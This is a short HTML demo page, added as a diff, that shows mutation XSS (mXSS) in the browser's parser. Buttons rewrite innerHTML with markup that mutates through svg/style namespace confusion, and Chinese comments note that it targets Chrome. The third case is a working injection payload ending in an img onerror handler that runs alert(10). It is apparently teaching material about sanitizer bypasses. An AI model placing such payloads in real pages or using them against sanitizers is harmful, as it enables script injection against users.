@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>mXSS Example</title>
+    <script>
+        function mutations1() {
+            document.getElementById("first").innerHTML = '<u> uss <i> iss';
+        }
+        function mutations2() {
+            document.getElementById("second").innerHTML = '<svg><p>文字内容在 svg 标签内吗</svg>';
+            document.getElementById("second2").innerHTML = '<svg><p></p>文字内容在 svg 标签内吗</svg>';
+        }
+        function mutations3() {
+            document.getElementById("third").innerHTML = '<svg></p><style><a id="</style><img src onerror=alert(10)>">';
+        }
+    </script>
+</head>
+<body>
+<p id="first">first: origin text</p>
+<button type="button" onclick="mutations1()">change first</button>
+<hr>
+
+<p id="second">second: origin text: 针对 chrome 的 mXSS </p>
+<p id="second2">second2: origin text: 针对 chrome 的 mXSS </p>
+<button type="button" onclick="mutations2()">change second</button>
+<hr>
+
+<p id="third">third: origin text</p>
+<button type="button" onclick="mutations3()">change third</button>
+<hr>
+
+</body>
+</html>
